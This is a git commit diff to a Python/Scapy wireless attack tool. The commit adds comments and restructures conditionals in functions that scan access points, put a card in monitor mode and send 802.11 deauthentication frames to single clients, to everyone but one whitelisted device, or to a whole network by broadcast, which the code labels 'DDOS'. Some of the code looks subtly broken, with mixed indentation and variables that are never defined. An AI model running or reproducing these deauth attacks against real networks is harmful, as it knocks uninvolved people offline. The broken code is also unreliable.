b26750a5234bcb7f39fb880043fbf00ab65874ac
Vit Faltus <vit.faltus@gmail.com>
2025-05-10 19:57:43 +0200

    Add comments, improvments to if statements

--- main.py
+++ main.py
@@ -1,8 +1,39 @@
 from scapy.all import *
 import subprocess
 import random
+import time
+import os
 
+# ---SETUP FUNCTIONS---
 
+#gets all interfaces listed in /sys/class/net
+def scan_interfaces(): 
+    try:
+        interfaces = os.listdir('/sys/class/net')
+        interfaces.remove("lo")
+        if len(interfaces) > 0:
+            return interfaces
+        else:
+            print("No interface found")
+    
+    except Exception as e:
+        print("Error:",e)
+        return None
+
+#used for setup of a interface to be set in monitor mode
+def Select_interface():
+	ifaces = scan_interfaces()
+	if ifaces:
+		print("Please select one wireless interface: ")
+		print(ifaces)
+		usr_inp = input()
+		return usr_inp
+	else:
+		print("No interfaces found!")
+		print("Selecting default interface: {}".format(conf.iface))
+		return conf.iface
+
+#used for setting the wifi card to monitor mode
 def SetMonitorMode(interf):
 
 	print("Setting interface {} to monitor mode...".format(interf))
@@ -17,6 +48,7 @@ def SetMonitorMode(interf):
 	print("Interface {} has been successfully set to monitor mode".format(interf))
 	return 0
 
+#used for setting the wifi card back to managed mode
 def SetManagedMode(interf):
 
 	print("Setting interface {} to managed mode...".format(interf))
@@ -32,18 +64,9 @@ def SetManagedMode(interf):
 	print("Interface {} has been successfully set to managed mode".format(interf))
 	return 0
 
-def scan_interfaces(): 
-    try:
-        interfaces = os.listdir('/sys/class/net')
-        interfaces.remove("lo")
-        if len(interfaces) > 0:
-        	return interfaces
-        else:
-        	print("No interface found")
-    except Exception as e:
-        print("Error:",e)
-        return None
+# ---COMMAND FUNCTIONS---
 
+#Help output
 def Help():
 	print("""Usage: [Command] [Specification] [Value]
 
@@ -62,13 +85,13 @@ Comands:
 	<> - optional
 	------------------------------------------------------------------""") 
 
+#looks for beacon frames of nearby APs and prints them
 def Scan(interf, time_of_attack):
 	aps = {}
 	def AP_scan(packet):
-		if packet.haslayer(Dot11):
-			if packet.type == 0 and packet.subtype == 8:
-					if packet.addr3 not in aps:
-						aps[packet.addr3] = packet.info.decode('utf-8')
+		if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
+			if packet.addr3 not in aps:
+				aps[packet.addr3] = packet.info.decode('utf-8')
 	print("Scanning...")
 	sniff(iface=interf, prn=AP_scan, store=0, timeout=time_of_attack)
 	print("BSSID             ; ESSID")
@@ -76,7 +99,8 @@ def Scan(interf, time_of_attack):
 		print("{} ; {}".format(mac, ssid))
 
 	return aps
-		
+
+#send deauth frames to specific AP		
 def Deauth_client(interf, target_mac, gateway_mac, SSID, time_of_attack):
 	deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2=target_mac,addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))
 	if SSID != " ":
@@ -96,23 +120,21 @@ def Deauth_client(interf, target_mac, gateway_mac, SSID, time_of_attack):
 	else:
 		print("Exitting!")
 
-
+#capture traffic between specific device and other devices
 def Scan_clients(interf, gateway_mac, time_of_attack):
 	clients = []
 	def handle_packets(packet):
-		if packet.haslayer(Dot11):
-			if packet.type != 0 and packet.subtype != 8:
-				if packet.addr2 == gateway_mac:
-					if packet.addr1 not in clients and packet.addr1 != "ff:ff:ff:ff:ff:ff" and packet.addr1 != None:
+		if packet.haslayer(Dot11) and packet.type != 0 and packet.subtype != 8:
+				if packet.addr2 == gateway_mac and packet.addr1 not in clients and packet.addr1 != "ff:ff:ff:ff:ff:ff" and packet.addr1 != None:
 						clients.append(packet.addr1)
 				elif packet.addr1 == gateway_mac:
 					if packet.addr2 not in clients and packet.addr2 != "ff:ff:ff:ff:ff:ff"and packet.addr2 != None:
 						clients.append(packet.addr2)
 
-
 	sniff(iface=interf, prn=handle_packets, store=0, timeout=time_of_attack)
 	return clients
 
+#sends deauth frames to everyone on a given network except one MAC address
 def Prio_deauth(interf, gateway_mac, SSID, whitelisted_mac, time_of_attack):
 	print("Deauthing everyone from {} ({}) except {}".format(SSID, gateway_mac, whitelisted_mac))
 	k = time.time()
@@ -124,7 +146,8 @@ def Prio_deauth(interf, gateway_mac, SSID, whitelisted_mac, time_of_attack):
 				for i in range(16):
 					send(deauth_client)
 		time.sleep(random.randint(2,6)/10)
-			
+
+#used to increase traffic on a network instead of full DDOS	
 def Gen_traf(interf, gateway_mac, ESSID, time_of_attack):
 	print("Generating traffic on {} ({})".format(ESSID, gateway_mac))
 	k = time.time()
@@ -132,39 +155,16 @@ def Gen_traf(interf, gateway_mac, ESSID, time_of_attack):
 	while (time.time()-k) < time_of_attack :
 		for client, ssid in clients.items():
 			if clients != whitelisted_mac:
+				#deauth frame
 				deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2=client,addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))
 				for i in range(3):
 					send(deauth_client)
 			time.sleep(random.randint(2,6)/10)
 		time.sleep(random.randint(2,6))
 
-def Vuln(interf): 
-	clients = []
-	def handler(packet): 
-		if packet.haslayer(Dot11):
-			if packet.type == 0 and (packet.subtype == 10 or packet.subtype == 12):
-				if REWORK == 1 and [packet.addr2, 1] not in clients:
-					clients.append([packet.addr2, 1])
-				elif [packet.addr2, 0] not in clients:
-					clients.append([packet.addr2, 0])
-	sniff(interf, timeout=10)
-	if clients:
-		for cl in clients:
-			print(cl[0], cl[1]) # EXPERIMENTAL
-
-def Select_interface():
-	ifcaces = scan_interfaces()
-	if ifaces:
-		print("Please select one wireless interface: ")
-		print(ifaces)
-		usr_inp = input()
-		return usr_inp
-	else:
-		print("No interfaces found!")
-		print("Selecting default interface: {}".format(conf.iface))
-		return conf.iface
-
+#DDOS of specific network
 def DDOS(interf, gateway_mac, SSID, time_of_attack):
+	#deauth frame with broadcast address
 	deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2="ff:ff:ff:ff:ff:ff",addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))
 	if SSID != " ":
 		last_check = input("Are you sure to deauth {} ({})? [y/n] ".format( gateway_mac, SSID))
@@ -188,6 +188,7 @@ def main():
 	if __name__ != "__main__":
 		return -1
 
+    #variables initialization
 	user_input = " "
 	selected_gateway = " "
 	selected_SSID = " "
@@ -195,6 +196,7 @@ def main():
 	duos_ssid_bssid = {}
 	clients = []
 
+    #string commands and abbreviations
 	string_gateways = ["Gateway", "gateway", "gtw", "Gtw"]
 	string_interfaces = ["Interface", "interface", "interf", "int"]
 	string_exits = ["exit", "Exit", "ext"]
@@ -208,6 +210,7 @@ def main():
 	string_gens = ["GenTraf", "gentraf", "gen", "Gen", "traf", "Traf"]
 	string_stats = ["Stat", "stat", "stats", "Stats", "st", "St"]
 	
+    #interface setup
 	selected_interface = Select_interface()
 	if selected_interface == "":
 		print(conf.iface)
@@ -216,39 +219,41 @@ def main():
 
 	while user_input[0] not in string_exits:
 		
-		if user_input[0] in string_sets: # SET
-			if len(user_input) > 2:
-				if user_input[1] in string_gateways:
-					selected_gateway = user_input[2]
-					selected_SSID = duos_ssid_bssid[selected_gateway]
-					print("Target gateway set to {}".format(selected_gateway))
-				elif user_input[1] in string_interfaces:
-					if selected_interface != user_input:
-						SetManagedMode(selected_interface)
-						selected_interface = user_input[2]
-						SetMonitorMode(selected_interface)
-					print("Interface set to {}".format(selected_interface))
-				elif user_input[1] in string_times:
-					time_of_attack = int(user_input[2])
-					print("Time of attack set to {} s".format(time_of_attack))
-				else:
-					Help()
+        #SET command
+		if user_input[0] in string_sets and len(user_input) > 2: 
+			if user_input[1] in string_gateways:
+				selected_gateway = user_input[2]
+				selected_SSID = duos_ssid_bssid[selected_gateway]
+				print("Target gateway set to {}".format(selected_gateway))
+			elif user_input[1] in string_interfaces:
+				if selected_interface != user_input:
+					SetManagedMode(selected_interface)
+					selected_interface = user_input[2]
+					SetMonitorMode(selected_interface)
+				print("Interface set to {}".format(selected_interface))
+			elif user_input[1] in string_times:
+				time_of_attack = int(user_input[2])
+				print("Time of attack set to {} s".format(time_of_attack))
+			else:
+				Help()
 
-		elif user_input[0] in string_scans: # SCAN
+        #SCAN command
+		elif user_input[0] in string_scans: 
 			duos_ssid_bssid =  Scan(selected_interface, time_of_attack)
 
-		elif user_input[0] in string_deauth: # DEAUTH
-			if len(user_input) > 1:
-				Deauth_client(selected_interface, user_input[1], selected_gateway, duos_ssid_bssid[selected_gateway], time_of_attack)
+        #DEAUTH command
+		elif user_input[0] in string_deauth and len(user_input) > 1: 
+			Deauth_client(selected_interface, user_input[1], selected_gateway, duos_ssid_bssid[selected_gateway], time_of_attack)
 
-		elif user_input[0] in string_prio: # PRIO
+        #PRIO command
+		elif user_input[0] in string_prio: 
 			if len(user_input) < 2:
 				Prio_deauth(selected_interface, selected_gateway, selected_SSID , input("Please provide mac address to be prioritized: "), time_of_attack)
 			elif len(user_input) == 2:
 				Prio_deauth(selected_interface, selected_gateway, selected_SSID, user_input[1], time_of_attack)
 
-		
-		elif user_input[0] in string_clients: # CLIENTS
+		#CLIENTS command
+		elif user_input[0] in string_clients: 
 			if len(user_input) < 2 and selected_gateway == " ":
 				tmp = input("Select target gateway: ")
 				clients = Scan_clients(selected_interface, tmp, time_of_attack)
@@ -285,9 +290,9 @@ def main():
 					print("{} clients detected".format(len(clients)))
 					for cl in clients:
 						print(cl)
-					
 		
-		elif user_input[0] in string_stats: # STATS
+        #STATS command			
+		elif user_input[0] in string_stats: 
 			print("Selected Interface: {}".format(selected_interface))
 			print("Selected Gateway: {}". format(selected_gateway))
 			print("SSID: {}".format(selected_SSID))
@@ -300,13 +305,17 @@ def main():
 			print("Detected clients:")
 			for client in clients:
 				print(client)
-		elif user_input[0] in string_gens: # GENERATE
+		
+        #GENERATE command
+		elif user_input[0] in string_gens: 
 			if len(user_input) < 3 and selected_gateway == " ":
 				tmp = input("Select target gateway: ")
 				Gen_traf(selected_interface, tmp, duos_ssid_bssid[tmp], time_of_attack)
 			else:
 				Gen_traf(selected_interface, selected_gateway, selected_SSID, time_of_attack)
-		elif user_input[0] in string_DDOS: # DDOS
+		
+        #DDOS command
+		elif user_input[0] in string_DDOS: 
 			if len(user_input) < 2 and selected_gateway == " ":
 				tmp = input("Select target gateway: ")
 				DDOS(selected_interface, tmp, duos_ssid_bssid[tmp], time_of_attack)
